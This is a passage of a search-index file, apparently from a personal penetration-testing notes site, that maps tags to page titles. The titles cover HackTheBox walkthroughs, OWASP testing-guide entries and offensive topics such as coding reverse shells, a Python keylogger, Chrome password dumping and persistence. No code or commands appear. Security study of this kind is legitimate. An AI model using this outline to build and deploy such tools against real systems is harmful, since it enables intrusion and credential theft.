8080","text":"<ul> <li>8080 JBoss AS Instance 6.1.0</li> </ul>","tags":["tags"]},{"location":"tags/#port-993","title":"port 993","text":"<ul> <li>Ports 110,143,993, 995 IMAP POP3</li> </ul>","tags":["tags"]},{"location":"tags/#port-995","title":"port 995","text":"<ul> <li>Ports 110,143,993, 995 IMAP POP3</li> </ul>","tags":["tags"]},{"location":"tags/#port-scanner","title":"port scanner","text":"<ul> <li>Coding a reverse shell that scans ports</li> </ul>","tags":["tags"]},{"location":"tags/#ports","title":"ports","text":"<ul> <li>Well-known ports</li> </ul>","tags":["tags"]},{"location":"tags/#post-exploitation","title":"post exploitation","text":"<ul> <li>Empire</li> </ul>","tags":["tags"]},{"location":"tags/#postgresql","title":"postgresql","text":"<ul> <li>5432 postgresql</li> <li>Walkthrough - A HackTheBox machine - Funnel</li> </ul>","tags":["tags"]},{"location":"tags/#powershell","title":"powershell","text":"<ul> <li>Azure Powershell</li> <li>dsquery</li> </ul>","tags":["tags"]},{"location":"tags/#privilege-escalation","title":"privilege escalation","text":"<ul> <li>Configuration files</li> <li>Create a Registry</li> <li>Cron jobs - path, wildcards, file overwrite.</li> <li>Walkthrough - Included - A HackTheBox machine</li> <li>Index for Linux Privilege Escalation</li> <li>Index for Windows Privilege Escalation</li> <li>Kernel vulnerability exploitation</li> <li>linPEAS - A tool to scan Linux system</li> <li>Linux exploit suggester</li> <li>Linux Privilege Checker</li> <li>lxd</li> <li>Pass The Hash</li> <li>PowerUp.ps1</li> <li>Process capabilities - getcap</li> <li>SSH keys</li> <li>Suid Binaries</li> <li>Windows binaries -  LOLBAS</li> <li>Recently accessed files and executed commands</li> <li>winPEAS - Windows Privilege Escalation Awesome Scripts</li> <li>Privilege escalation - Weak service file permission</li> </ul>","tags":["tags"]},{"location":"tags/#privileges-escalation","title":"privileges escalation","text":"<ul> <li>Dirty COW (Copy On Write)</li> </ul>","tags":["tags"]},{"location":"tags/#problems","title":"problems","text":"<ul> <li>How to resolve run of the mill...</li> </ul>","tags":["tags"]},{"location":"tags/#procesmonitor","title":"procesMonitor","text":"<ul> <li>Information gathering phase - Thick client Applications</li> </ul>","tags":["tags"]},{"location":"tags/#process-hacker-tool","title":"process hacker tool","text":"<ul> <li>Attacking thick clients applications - Data storage issues</li> </ul>","tags":["tags"]},{"location":"tags/#proxy","title":"proxy","text":"<ul> <li>3128 squid</li> <li>Burpsuite</li> <li>Interactsh - An alternative to BurpSuite Collaborator</li> <li>proxychains</li> </ul>","tags":["tags"]},{"location":"tags/#public-cloud","title":"public cloud","text":"<ul> <li>Amazon Web Services (AWS) Essentials</li> <li>Google Cloud Platform Essentials</li> </ul>","tags":["tags"]},{"location":"tags/#python","title":"python","text":"<ul> <li>django pentesting</li> <li>Inmunity Debugger</li> <li>noip</li> <li>pyftpdlib - A ftp server written in python</li> <li>pyinstaller</li> <li>Responder.py - A SMB server to listen to NTLM hashes</li> <li>Bypassing IPS with handmade XOR Encryption</li> <li>Bypassing Next Generation Firewalls</li> <li>Coding a data exfiltration script for a http shell</li> <li>Coding a low level data exfiltration - TCP connection</li> <li>Coding a reverse shell that scans ports</li> <li>Coding a reverse shell that searches files</li> <li>Coding a TCP connection and d reverse shell</li> <li>Coding an http reverse shell</li> <li>Coding a DDNS aware shell</li> <li>DNS poisoning</li> <li>Dumping saved passwords from Google Chrome</li> <li>Hickjack the Internet Explorer process to bypass an host-based firewall</li> <li>Hijacking Keepass Password Manager</li> <li>Including cd command into TCP reverse shell</li> <li>Making a screenshot</li> <li>Making your binary persistent</li> <li>Man in the browser attack</li> <li>pip</li> <li>Privilege escalation - Weak service file permission</li> <li>Installing python</li> <li>Simple keylogger in python</li> <li>Python tools for pentesting</li> <li>TCP reverse shell with AES encryption</li> <li>TCP reverse shell with hybrid encryption AES + RSA</li> <li>TCP reverse shell with RSA encryption</li> <li>Tunning the connection attempts</li> </ul>","tags":["tags"]},{"location":"tags/#python-pentesting","title":"python pentesting","text":"<ul> <li>Inmunity Debugger</li> <li>Bypassing IPS with handmade XOR Encryption</li> <li>Bypassing Next Generation Firewalls</li> <li>Coding a data exfiltration script for a http shell</li> <li>Coding a low level data exfiltration - TCP connection</li> <li>Coding a reverse shell that scans ports</li> <li>Coding a reverse shell that searches files</li> <li>Coding a TCP connection and d reverse shell</li> <li>Coding an http reverse shell</li> <li>Coding a DDNS aware shell</li> <li>DNS poisoning</li> <li>Dumping saved passwords from Google Chrome</li> <li>Hickjack the Internet Explorer process to bypass an host-based firewall</li> <li>Hijacking Keepass Password Manager</li> <li>Including cd command into TCP reverse shell</li> <li>Making a screenshot</li> <li>Making your binary persistent</li> <li>Man in the browser attack</li> <li>Privilege escalation - Weak service file permission</li> <li>Installing python</li> <li>Simple keylogger in python</li> <li>Python tools for pentesting</li> <li>TCP reverse shell with AES encryption</li> <li>TCP reverse shell with hybrid encryption AES + RSA</li> <li>TCP reverse shell with RSA encryption</li> <li>Tunning the connection attempts</li> </ul>","tags":["tags"]},{"location":"tags/#r-services","title":"r-services","text":"<ul> <li>Ports 512, 513, 514 - Remote Execution (REXEC) services</li> </ul>","tags":["tags"]},{"location":"tags/#rce","title":"rce","text":"<ul> <li>Walkthrough - Greenhorn - A HackTheBox machine</li> <li>SirepRAT - RCE as SYSTEM on Windows IoT Core</li> <li>smbmap</li> </ul>","tags":["tags"]},{"location":"tags/#rdp","title":"rdp","text":"<ul> <li>Port 3389 - Remote Desktop Protocol (RDP)</li> <li>rdesktop</li> <li>Snaffler - a tool for enumerating creds and shares in Active Directory</li> <li>xfreerdp</li> </ul>","tags":["tags"]},{"location":"tags/#reconnaissance","title":"reconnaissance","text":"<ul> <li>The ActiveDirectory PowerShell module</li> <li>BloodHound</li> <li>ctr.sh</li> <li>Depix - A tool for extracting data from pixeled images</li> <li>dnscan - A DNS subdomain scanner</li> <li>feroxbuster - A web content enumeration tool for not referenced resources</li> <li>fping - An improved ping tool</li> <li>Github dorks</li> <li>Google dorks</li> <li>grep</li> <li>HTTrack - A tool for mirrowing sites</li> <li>masscan - An IP scanner</li> <li>Nessus</li> <li>netcraft</li> <li>netdiscover - A network enumeration tool based on ARP request</li> <li>nikto</li> <li>nmap - A network exploration and security auditing tool</li> <li>OpenVAS</li> <li>openVAS Reporting</li> <li>p0f</li> <li>ping</li> <li>Powercat - An alternative to netcat coded in PowerShell</li> <li>Powerview.ps1</li> <li>SharpView</li> <li>sublist3r - A subdomain enumerating tool</li> <li>tcpdump - A command-line packet analyzer</li> <li>The Harvester - A tool for pasive and active reconnaissance</li> <li>waybackurls</li> <li>Test Network Infrastructure Configuration - OWASP Web Security Testing Guide</li> <li>Test Application Platform Configuration - OWASP Web Security Testing Guide</li> <li>Test File Extensions Handling for Sensitive Information - OWASP Web Security Testing Guide</li> <li>Review Old Backup and Unreferenced Files for Sensitive Information - OWASP Web Security Testing Guide</li> <li>Enumerate Infrastructure and Application Admin Interfaces - OWASP Web Security Testing Guide</li> <li>Test HTTP Methods - OWASP Web Security Testing Guide</li> <li>Test HTTP Strict Transport Security - OWASP Web Security Testing Guide</li> <li>Test RIA Cross Domain Policy - OWASP Web Security Testing Guide</li> <li>Test File Permission - OWASP Web Security Testing Guide</li> <li>Test for Subdomain Takeover - OWASP Web Security Testing Guide</li> <li>Test Cloud Storage - OWASP Web Security Testing Guide</li> <li>Testing for Content Security Policy - OWASP Web Security Testing Guide</li> <li>Test Path Confusion - OWASP Web Security Testing Guide</li> <li>Conduct search engine discovery reconnaissance for information leakage - OWASP Web Security Testing Guide</li> <li>Fingerprint Web Server - OWASP Web Security Testing Guide</li> <li>Review Webserver Metafiles for Information Leakage - OWASP Web Security Testing Guide</li> <li>Enumerate Applications on Webserver - OWASP Web Security Testing Guide</li> <li>Review Webpage content for Information Leakage - OWASP Web Security Testing Guide</li> <li>Identify Application Entry Points - OWASP Web Security Testing Guide</li> <li>Map Execution Paths through applications - OWASP Web Security Testing Guide</li> <li>Fingerprint Web Application Framework - OWASP Web Security Testing Guide</li> <li>Fingerprint Web Applications - OWASP Web Security Testing Guide</li> <li>Map Application architecture - OWASP Web Security Testing Guide</li> </ul>","tags":["tags"]},{"location":"tags/#redis","title":"redis","text":"<ul> <li>6379 redis</li> <li>Walkthrough - A HackTheBox machine - Redeemer</li> </ul>","tags":["tags"]},{"location":"tags/#reflexil","title":"reflexil","text":"<ul> <li>Reversing and patching thick clients applications</li> </ul>","tags":["tags"]},{"location":"tags/#registry","title":"registry","text":"<ul> <li>Making your binary persistent</li> </ul>","tags":["tags"]},{"location":"tags/#regshot","title":"regshot","text":"<ul> <li>Attacking thick clients applications - Data storage issues</li> </ul>","tags":["tags"]},{"location":"tags/#relational","title":"relational","text":"<ul> <li>sqlite</li> <li>Virtual environments</li> </ul>","tags":["tags"]},{"location":"tags/#relational-database","title":"relational database","text":"<ul> <li>MariaDB</li> <li>MySQL</li> </ul>","tags":["tags"]},{"location":"tags/#reporting","title":"reporting","text":"<ul> <li>openVAS Reporting</li> <li>xsltproc</li> </ul>","tags":["tags"]},{"location":"tags/#resources","title":"resources","text":"<ul> <li>LOLbins - Living off the land binaries - LOLbas and GTFObins</li> <li>Repo for legacy Operating system</li> <li>Index of downloads</li> </ul>","tags":["tags"]},{"location":"tags/#responderpy","title":"responder.py","text":"<ul> <li>Responder - A HackTheBox machine</li> </ul>","tags":["tags"]},{"location":"tags/#reverse-shell","title":"reverse shell","text":"<ul> <li>Bank - A HackTheBox machine</li> <li>Base - A HackTheBox machine</li> <li>Nibbles - A HackTheBox machine</li> <li>Popcorn - A HackTheBox machine</li> <li>pentesmonkey php reverse shell</li> <li>Coding a data exfiltration script for a http shell</li> <li>Coding a low level data exfiltration - TCP connection</li> <li>Coding a reverse shell that scans ports</li> <li>Coding a reverse shell that searches files</li> <li>Coding a TCP connection and d reverse shell</li> <li>Coding an http reverse shell</li> <li>Coding a DDNS aware shell</li> <li>Hickjack the Internet Explorer process to bypass an host-based firewall</li> <li>Including cd command into TCP reverse shell</li> <li>Making a screenshot</li> <li>Making your binary persistent</li> <li>TCP reverse shell with AES encryption</li> <li>TCP reverse shell with hybrid encryption AES + RSA</li> <li>TCP reverse shell with RSA encryption</li> <li>Tunning the connection attempts</li> </ul>","tags":["tags"]},{"location":"tags/#reverse-engineering","title":"reverse-engineering","text":"<ul> <li>Reverse engineering</li> </ul>","tags":["tags"]},{"location":"tags/#reverse-shells","title":"reverse-shells","text":"<ul> <li>Reverse Shells</li> <li>Web Shells</li> </ul>","tags":["tags"]},{"location":"tags/#rpc","title":"rpc","text":"<ul> <li>Port 111, 32731 -  rpc</li> <li>Port 43 - whois</li> </ul>","tags":["tags"]},{"location":"tags/#rsa","title":"rsa","text":"<ul> <li>TCP reverse shell with hybrid encryption AES + RSA</li> <li>TCP reverse shell with RSA encryption</li> </ul>","tags":["tags"]},{"location":"tags/#rsync","title":"rsync","text":"<ul> <li>Port 873 - rsync</li> </ul>","tags":["tags"]},{"location":"tags/#s3","title":"s3","text":"<ul> <li>AWS cli</li> </ul>","tags":["tags"]},{"location":"tags/#samba","title":"samba","text":"<ul> <li>Ports 137, 138, 139, 445 SMB</li> <li>rpcclient - A tool for interacting with smb shares</li> <li>smbclient - A tool for interacting with smb shares</li> </ul>","tags":["tags"]},{"location":"tags/#scanner","title":"scanner","text":"<ul> <li>Depix - A tool for extracting data from pixeled images</li> <li>Nessus</li> <li>OpenVAS</li> <li>openVAS Reporting</li> </ul>","tags":["tags"]},{"location":"tags/#scanning","title":"scanning","text":"<ul> <li>Port 53 - Domain Name Server (DNS)</li> <li>ctr.sh</li> <li>dnscan - A DNS subdomain scanner</li> <li>fping - An improved ping tool</li> <li>Github dorks</li> <li>Google dorks</li> <li>HTTrack - A tool for mirrowing sites</li> <li>masscan - An IP scanner</li> <li>nmap - A network exploration and security auditing tool</li> <li>p0f</li> <li>ping</li> <li>Powercat - An alternative to netcat coded in PowerShell</li> <li>sublist3r - A subdomain enumerating tool</li> </ul>","tags":["tags"]},{"location":"tags/#screenshot-capturer","title":"screenshot capturer","text":"<ul> <li>Making a screenshot</li> </ul>","tags":["tags"]},{"location":"tags/#scripting","title":"scripting","text":"<ul> <li>Bypassing IPS with handmade XOR Encryption</li> <li>Bypassing Next Generation Firewalls</li> <li>Coding a data exfiltration script for a http shell</li> <li>Coding a low level data exfiltration - TCP connection</li> <li>Coding a reverse shell that scans ports</li> <li>Coding a reverse shell that searches files</li> <li>Coding a TCP connection and d reverse shell</li> <li>Coding an http reverse shell</li> <li>Coding a DDNS aware shell</li> <li>Dumping saved passwords from Google Chrome</li> <li>Hickjack the Internet Explorer process to bypass an host-based firewall</li> <li>Hijacking Keepass Password Manager</li> <li>Including cd command into TCP reverse shell</li> <li>Making a screenshot</li> <li>Making your binary persistent</li> <li>pip</li> <li>Privilege escalation - Weak service file permission</li> <li>Installing python</li> <li>Simple keylogger in python</li> <li>Python tools for pentesting</li> <li>TCP reverse shell with AES encryption</li> <li>TCP reverse shell with hybrid encryption AES + RSA</li> <li>TCP reverse shell with RSA encryption</li> <li>Tunning the connection attempts</li> </ul>","tags":["tags"]},{"location":"tags/#serialization-vulnerability","title":"serialization vulnerability","text":"<ul> <li>Log4j</li> </ul>","tags":["tags"]},{"location":"tags/#server","title":"server","text":"<ul> <li>Inveigh</li> <li>Responder.py - A SMB server to listen to NTLM hashes</li> <li>smbserver - from impacket</li> <li>swaks</li> <li>uploadserver</li> <li>WebDav- WsgiDAV - A generic and extendable WebDAV server</li> </ul>","tags":["tags"]},{"location":"tags/#server-enumeration","title":"server enumeration","text":"<ul> <li>httprint - A web server fingerprinting tool</li> </ul>","tags":["tags"]},{"location":"tags/#servers","title":"servers","text":"<ul> <li>Interactsh - An alternative to BurpSuite Collaborator</li> <li>Setting up servers</li> </ul>","tags":["tags"]},{"location":"tags/#services","title":"services","text":"<ul> <li>Well-known ports</li> </ul>","tags":["tags"]},{"location":"tags/#sheet","title":"sheet","text":"<ul> <li>Pentesting Powerapp</li> </ul>","tags":["tags"]},{"location":"tags/#shells","title":"shells","text":"<ul> <li>msfvenom</li> <li>Spawn a shell</li> <li>Tmux - A terminal multiplexer</li> </ul>","tags":["tags"]},{"location":"tags/#smb","title":"smb","text":"<ul> <li>Ports 137, 138, 139, 445 SMB</li> <li>Port 2049 -  NFS Network File System</li> <li>Tactics - A HackTheBox machine</li> <li>ntlmrelayx - a module from Impacket</li> <li>PsExec - a module from Impacket</li> <li>rpcclient - A tool for interacting with smb shares</li> <li>smbclient - A tool for interacting with smb shares</li> <li>smbmap</li> </ul>","tags":["tags"]},{"location":"tags/#smb-vulnerability","title":"smb vulnerability","text":"<ul> <li>Lame - A HackTheBox machine</li> </ul>","tags":["tags"]},{"location":"tags/#snmp_1","title":"snmp","text":"<ul> <li>braa - SNMP scanner</li> <li>Final recon - a recon tool with modules</li> <li>odat - Oracle Database Attacking Tool</li> <li>onesixtyone - Fast and simple SNMP scanner</li> <li>snmpwalk - SNMP scanner</li> </ul>","tags":["tags"]},{"location":"tags/#soap","title":"soap","text":"<ul> <li>Pentesting web services</li> </ul>","tags":["tags"]},{"location":"tags/#sql_1","title":"sql","text":"<ul> <li>Sequel - A HackTheBox machine</li> </ul>","tags":["tags"]},{"location":"tags/#sql-injection","title":"sql injection","text":"<ul> <li>Attacking thick clients applications - Data storage issues</li> </ul>","tags":["tags"]},{"location":"tags/#sqli","title":"sqli","text":"<ul> <li>BurpSuite Labs - SQL injection</li> </ul>","tags":["tags"]},{"location":"tags/#ssrf","title":"ssrf","text":"<ul> <li>Gopherus</li> <li>BurpSuite Labs - Broken access control vulnerabilities</li> <li>BurpSuite Labs - Server Side Request Forgery</li> </ul>","tags":["tags"]},{"location":"tags/#ssti","title":"ssti","text":"<ul> <li>BurpSuite Labs - Server Side Template Injection</li> </ul>","tags":["tags"]},{"location":"tags/#strings","title":"strings","text":"<ul> <li>Attacking thick clients applications - Data storage issues</li> </ul>","tags":["tags"]},{"location":"tags/#subdomain","title":"subdomain","text":"<ul> <li>Port 53 - Domain Name Server (DNS)</li> <li>ctr.sh</li> <li>dnscan - A DNS subdomain scanner</li> </ul>","tags":["tags"]},{"location":"tags/#subdomains","title":"subdomains","text":"<ul> <li>sublist3r - A subdomain enumerating tool</li> </ul>","tags":["tags"]},{"location":"tags/#suid-binaries","title":"suid binaries","text":"<ul> <li>Bank - A HackTheBox machine</li> <li>Popcorn - A HackTheBox machine</li> </ul>","tags":["tags"]},{"location":"tags/#suid-binary","title":"suid binary","text":"<ul> <li>Base - A HackTheBox machine</li> </ul>","tags":["tags"]},{"location":"tags/#tcp","title":"tcp","text":"<ul> <li>p0f</li> </ul>","tags":["tags"]},{"location":"tags/#tcp-view","title":"tcp view","text":"<ul> <li>Information gathering phase - Thick client Applications</li> </ul>","tags":["tags"]},{"location":"tags/#technique","title":"technique","text":"<ul> <li>Building a plugin in obsidian</li> <li>Honeypots</li> </ul>","tags":["tags"]},{"location":"tags/#techniques","title":"techniques","text":"<ul> <li>Pentesting Tomcat</li> <li>DNS poisoning</li> <li>Man in the browser attack</li> </ul>","tags":["tags"]},{"location":"tags/#telnet","title":"telnet","text":"<ul> <li>23 telnet</li> </ul>","tags":["tags"]},{"location":"tags/#terminal","title":"terminal","text":"<ul> <li>msfvenom</li> <li>Spawn a shell</li> <li>Tmux - A terminal multiplexer</li> </ul>","tags":["tags"]},{"location":"tags/#tftp","title":"tftp","text":"<ul> <li>21 ftp</li> <li>Walkthrough - Included - A HackTheBox machine</li> </ul>","tags":["tags"]},{"location":"tags/#thick-applications","title":"thick applications","text":"<ul> <li>CFF explorer</li> <li>CFF explorer</li> <li>mitm_relay Suite</li> <li>SysInternals Suite</li> </ul>","tags":["tags"]},{"location":"tags/#thick-client","title":"thick client","text":"<ul> <li>Window Detective - A tool to view windows properties in the system</li> <li>winspy - A tool to view windows properties in the system</li> </ul>","tags":["tags"]},{"location":"tags/#thick-client-application","title":"thick client application","text":"<ul> <li>Process Hacker tool</li> </ul>","tags":["tags"]},{"location":"tags/#thick-client-applications","title":"thick client applications","text":"<ul> <li>Pentesting Thick client Applications - Introduction</li> <li>Attacking thick clients applications - Data storage issues</li> <li>Basic Lab Setup - Thick client Applications</li> <li>Common vulnerabilities</li> <li>First challenge - Enabling a button - Thick client Applications</li> <li>Information gathering phase - Thick client Applications</li> <li>Reversing and patching thick clients applications</li> <li>Traffic analysis - Thick client Applications</li> <li>Thick client Applications Pentesting Checklist</li> <li>Tools for pentesting thick client applications</li> </ul>","tags":["tags"]},{"location":"tags/#thick-client-applications-pentesting","title":"thick client applications pentesting","text":"<ul> <li>Pentesting Thick client Applications - Introduction</li> <li>Attacking thick clients applications - Data storage issues</li> <li>Basic Lab Setup - Thick client Applications</li> <li>Common vulnerabilities</li> <li>First challenge - Enabling a button - Thick client Applications</li> <li>Information gathering phase - Thick client Applications</li> <li>Reversing and patching thick clients applications</li> <li>Traffic analysis - Thick client Applications</li> <li>Thick client Applications Pentesting Checklist</li> <li>Tools for pentesting thick client applications</li> </ul>","tags":["tags"]},{"location":"tags/#tool","title":"tool","text":"<ul> <li>dirb - A web content enumeration tool</li> <li>feroxbuster - A web content enumeration tool for not referenced resources</li> <li>Markdown</li> <li>postfix - A SMTP server</li> <li>xsltproc</li> </ul>","tags":["tags"]},{"location":"tags/#tools","title":"toolS","text":"<ul> <li>Network traffic capture tools</li> </ul>","tags":["tags"]},{"location":"tags/#tools_1","title":"tools","text":"<ul> <li>Port 135 - Windows Management Instrumentation (<code>WMI</code>)</li> <li>Port 5985, 5986 - Windows Remote Management (WinRM)</li> <li>The ActiveDirectory PowerShell module</li> <li>Amass</li> <li>apktool</li> <li>arjun</li> <li>arpspoof from dniff</li> <li>BeEF - The browser exploitation framework project</li> <li>BloodHound</li> <li>braa - SNMP scanner</li> <li>Pentesting browsers</li> <li>Burpsuite</li> <li>cewl - A custom dictionary generator</li> <li>Tools for cloning a site</li> <li>Crawlers</li> <li>crunch - A dictionary generator</li> <li>ctr.sh</li> <li>CUPP - Common User Password Profiler</li> <li>curl</li> <li>darkarmour</li> <li>Dictionaries or wordlists resources</li> <li>dig axfr</li> <li>dnsenum - A tool to enumerate DNS</li> <li>DNSRecon - DNS Enumeration and Scanning Tool</li> <li>dsquery</li> <li>evil-winrm</li> <li>fierce - DNS scanner that helps locate non-contiguous IP space and hostnames</li> <li>figlet</li> <li>Final recon - a recon tool with modules</li> <li>Inmunity Debugger</li> <li>Interactsh - An alternative to BurpSuite Collaborator</li> <li>Inveigh</li> <li>MailSniper</li> <li>mythic</li> <li>nishang</li> <li>nslookup</li> <li>o365spray</li> <li>odat - Oracle Database Attacking Tool</li> <li>onesixtyone - Fast and simple SNMP scanner</li> <li>Phpggc - A tool for PHP deserialization</li> <li>PowerUp.ps1</li> <li>PowerUpSQL</li> <li>Powerview.ps1</li> <li>proxychains</li> <li>rar - Winrar</li> <li>rdesktop</li> <li>Responder.py - A SMB server to listen to NTLM hashes</li> <li>rpcclient - A tool for interacting with smb shares</li> <li>Remote Server Administration Tools (RSAT)</li> <li>SharpView</li> <li>smbclient - A tool for interacting with smb shares</li> <li>smbmap</li> <li>Snaffler - a tool for enumerating creds and shares in Active Directory</li> <li>snmpwalk - SNMP scanner</li> <li>sqlplus - To connect and manage the Oracle RDBMS</li> <li>sshpass - A program to pass passwords in the command line to ssh</li> <li>SubBrute</li> <li>subfinder</li> <li>swaks</li> <li>The Harvester - A tool for pasive and active reconnaissance</li> <li>vnstat - Monitoring network impact</li> <li>waybackurls</li> <li>windapsearch - A tool for enumerating resources in Active Directory</li> <li>xfreerdp</li> <li>Ysoserial - A tool for Java deserialization</li> <li>Tools for pentesting thick client applications</li> <li>Creating malware and custom payloads</li> </ul>","tags":["tags"]},{"location":"tags/#traffic-tool","title":"traffic tool","text":"<ul> <li>CFF explorer</li> </ul>","tags":["tags"]},{"location":"tags/#visual-code-grepper","title":"visual code grepper","text":"<ul> <li>Common vulnerabilities</li> </ul>","tags":["tags"]},{"location":"tags/#vpn","title":"vpn","text":"<ul> <li>VPN notes</li> </ul>","tags":["tags"]},{"location":"tags/#vsftpd","title":"vsFTPd","text":"<ul> <li>21 ftp</li> </ul>","tags":["tags"]},{"location":"tags/#vulnerability","title":"vulnerability","text":"<ul> <li>dirb - A web content enumeration tool</li> </ul>","tags":["tags"]},{"location":"tags/#vulnerability-assessment","title":"vulnerability assessment","text":"<ul> <li>Nessus</li> <li>OpenVAS</li> <li>openVAS Reporting</li> </ul>","tags":["tags"]},{"location":"tags/#walkthrough","title":"walkthrough","text":"<ul> <li>Appointment - A HackTheBox machine</li> <li>Archetype - A HackTheBox machine</li> <li>Bank - A HackTheBox machine</li> <li>Base - A HackTheBox machine</li> <li>Crocodile - A HackTheBox machine</li> <li>Explosion - A HackTheBox machine</li> <li>Walkthrough - Friendzone - A HackTheBox machine</li> <li>Walkthrough - A HackTheBox machine - Funnel</li> <li>Walkthrough - Greenhorn - A HackTheBox machine</li> <li>Ignition - A HackTheBox machine</li> <li>Walkthrough - Included - A HackTheBox machine</li> <li>Lame - A HackTheBox machine</li> <li>Markup - A HackTheBox machine</li> <li>Walkthrough - Metatwo - A HackTheBox machine</li> <li>Walkthough - A HackTheBox machine - Mongod</li> <li>Nibbles - A HackTheBox machine</li> <li>Nunchucks - A HackTheBox machine</li> <li>Walkthrough - Omni - A HackTheBox machine</li> <li>Oppsie - A HackTheBox machine</li> <li>Pennyworth - A HackTheBox machine</li> <li>Walkthrough - Photobomb - A HackTheBox machine</li> <li>Popcorn - A HackTheBox machine</li> <li>Walkthrough - A HackTheBox machine - Redeemer</li> <li>Responder - A HackTheBox machine</li> <li>Sequel - A HackTheBox machine</li> <li>Walkthrough - Support - A HackTheBox machine</li> <li>Tactics - A HackTheBox machine</li> <li>Walkthrough - Trick - A HackTheBox machine</li> <li>Walkthrough - Unified - A HackTheBox machine</li> <li>Walkthrough - Usage - A HackTheBox machine</li> <li>Vaccine - A HackThebBox machine</li> <li>Walkthrough - GoldenEye 1, a vulnhub machine</li> <li>Vulnhub Raven 1</li> <li>Vulnhub Raven 2</li> <li>Index of walkthroughs</li> </ul>","tags":["tags"]},{"location":"tags/#web","title":"web","text":"<ul> <li>Port 22 - Secure Shell (SSH)</li> <li>Gopherus</li> <li>Information gathering</li> <li>netcraft</li> <li>proxychains</li> <li>rar - Winrar</li> <li>Reverse Shells</li> <li>Weevely - A PHP webshell backdoor generator</li> <li>OWASP Web Security Testing Guide</li> <li>Review Webserver Metafiles for Information Leakage - OWASP Web Security Testing Guide</li> <li>Enumerate Applications on Webserver - OWASP Web Security Testing Guide</li> <li>Review Webpage content for Information Leakage - OWASP Web Security Testing Guide</li> <li>Identify Application Entry Points - OWASP Web Security Testing Guide</li> <li>Map Execution Paths through applications - OWASP Web Security Testing Guide</li> <li>Fingerprint Web Application Framework - OWASP Web Security Testing Guide</li> <li>Fingerprint Web Applications - OWASP Web Security Testing Guide</li> <li>Map Application architecture - OWASP Web Security Testing Guide</li> <li>Web Exploitation Guide</li> <li>Arbitrary file upload</li> <li>CSRF attack - Cross Site Request Forgery</li> <li>HTTP Verb Tampering</li> <li>Insecure deserialization</li> <li>Json Web Token attacks</li> <li>NoSQL injection</li> </ul>","tags":["tags"]},{"location":"tags/#web-enumeration","title":"web enumeration","text":"<ul> <li>feroxbuster - A web content enumeration tool for not referenced resources</li> </ul>","tags":["tags"]},{"location":"tags/#web-pentesting","title":"web pentesting","text":"<ul> <li>3128 squid</li> <li>Aquatone - Automatize web scanner in large subdomain lists</li> <li>BeEF - The browser exploitation framework project</li> <li>Bind Shells</li> <li>Burpsuite</li> <li>cewl - A custom dictionary generator</li> <li>Tools for cloning a site</li> <li>crunch - A dictionary generator</li> <li>CUPP - Common User Password Profiler</li> <li>Dictionaries or wordlists resources</li> <li>django pentesting</li> <li>eWPT Preparation</li> <li>EyeWitness</li> <li>ffuf - A fast web fuzzer written in Go</li> <li>Responder - A HackTheBox machine</li> <li>Interactsh - An alternative to BurpSuite Collaborator</li> <li>knockpy - A subdomain scanner</li> <li>Laudanum - Injectable Web Exploit Code</li> <li>Lazagne</li> <li>Log4j</li> <li>moodlescan</li> <li>nikto</li> <li>searchsploit</li> <li>sslyze - A tool for scanning certificates</li> <li>Pentesting Tomcat</li> <li>veil - A backdoor generator</li> <li>Vulnhub Raven 1</li> <li>Vulnhub Raven 2</li> <li>w3af</li> <li>WafW00f - A firewall scanner</li> <li>wfuzz</li> <li>whatweb - A web scanner</li> <li>wpscan - Wordpress Security Scanner</li> <li>XSSer -  An automated web pentesting framework tool to detect and exploit XSS vulnerabilities</li> <li>Testing GraphQL - OWASP Web Security Testing Guide</li> <li>Testing for Credentials Transported over an Encrypted Channel - OWASP Web Security Testing Guide</li> <li>Testing for Default Credentials - OWASP Web Security Testing Guide</li> <li>Testing for Weak Lock Out Mechanism - OWASP Web Security Testing Guide</li> <li>Testing for Bypassing Authentication Schema - OWASP Web Security Testing Guide</li> <li>Testing for Vulnerable Remember Password - OWASP Web Security Testing Guide</li> <li>Testing for Browser Cache Weaknesses - OWASP Web Security Testing Guide</li> <li>Testing for Weak Password Policy - OWASP Web Security Testing Guide</li> <li>Testing for Weak Security Question Answer - OWASP Web Security Testing Guide</li> <li>Testing for Weak Password Change or Reset Functionalities - OWASP Web Security Testing Guide</li> <li>Testing for Weaker Authentication in Alternative Channel - OWASP Web Security Testing Guide</li> <li>Testing Multi-Factor Authentication (MFA) - OWASP Web Security Testing Guide</li> <li>Testing Directory Traversal File Include - OWASP Web Security Testing Guide</li> <li>Testing for Bypassing Authorization Schema - OWASP Web Security Testing Guide</li> <li>Testing for Privilege Escalation - OWASP Web Security Testing Guide</li> <li>Testing for Insecure Direct Object References - OWASP Web Security Testing Guide</li> <li>Testing for OAuth Weaknesses - OWASP Web Security Testing Guide</li> <li>Test Business Logic Data Validation - OWASP Web Security Testing Guide</li> <li>Test Ability to Forge Requests - OWASP Web Security Testing Guide</li> <li>Test Integrity Checks - OWASP Web Security Testing Guide</li> <li>Test for Process Timing - OWASP Web Security Testing Guide</li> <li>Test Number of Times a Function Can Be Used Limits - OWASP Web Security Testing Guide</li> <li>Testing for the Circumvention of Work Flows - OWASP Web Security Testing Guide</li> <li>Test Defenses Against Application Misuse - OWASP Web Security Testing Guide</li> <li>Test Upload of Unexpected File Types - OWASP Web Security Testing Guide</li> <li>Test Upload of Malicious Files - OWASP Web Security Testing Guide</li> <li>Test Payment Functionality - OWASP Web Security Testing Guide</li> <li>Testing for DOM-Based Cross Site Scripting - OWASP Web Security Testing Guide</li> <li>Testing for JavaScript Execution - OWASP Web Security Testing Guide</li> <li>Testing for HTML Injection - OWASP Web Security Testing Guide</li> <li>Testing for Client-side URL Redirect - OWASP Web Security Testing Guide</li> <li>Testing for CSS Injection - OWASP Web Security Testing Guide</li> <li>Testing for Client-side Resource Manipulation - OWASP Web Security Testing Guide</li> <li>Testing Cross Origin Resource Sharing - OWASP Web Security Testing Guide</li> <li>Testing for Cross Site Flashing - OWASP Web Security Testing Guide</li> <li>Testing for Clickjackingx - OWASP Web Security Testing Guide</li> <li>Testing WebSockets - OWASP Web Security Testing Guide</li> <li>Testing Web Messaging - OWASP Web Security Testing Guide</li> <li>Testing Browser Storage - OWASP Web Security Testing Guide</li> <li>Testing for Cross Site Script Inclusion - OWASP Web Security Testing Guide</li> <li>Testing for Reverse Tabnabbing - OWASP Web Security Testing Guide</li> <li>Test Network Infrastructure Configuration - OWASP Web Security Testing Guide</li> <li>Test Application Platform Configuration - OWASP Web Security Testing Guide</li> <li>Test File Extensions Handling for Sensitive Information - OWASP Web Security Testing Guide</li> <li>Review Old Backup and Unreferenced Files for Sensitive Information - OWASP Web Security Testing 